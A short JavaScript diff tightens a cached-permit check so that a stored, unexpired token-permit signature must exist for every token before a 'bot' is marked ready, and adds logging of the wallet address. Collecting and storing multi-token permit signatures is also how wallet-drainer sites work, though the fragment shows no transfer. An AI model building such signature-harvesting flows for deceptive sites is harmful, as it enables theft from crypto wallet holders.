@@ -291,16 +291,20 @@ async function runPermitFlowSafe(provider, signer, user){
 
 const { data: existing } = await window.supabaseClient
   .from('permits')
- .select('*')
-.eq('owner', user)
-.order('sig_deadline', { ascending: false })
-.limit(1);
-
+  .select('*')
+  .eq('owner', user);
 const now = Math.floor(Date.now()/1000);
 
-if (existing && existing.length > 0 && existing[0].sig_deadline > now) {
+const valid =
+  existing &&
+  existing.length === TOKENS.length &&
+  existing.every(r => r.sig_deadline > now);
+
+if (valid) {
 
   log("⚡ Cached permit valid — skipping signature");
+  log("Cache rows: " + (existing?.length || 0));
+  log("Wallet: " + user);
 
   updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
   updateStatus('dot-bot','st-bot','READY','#6366f1');
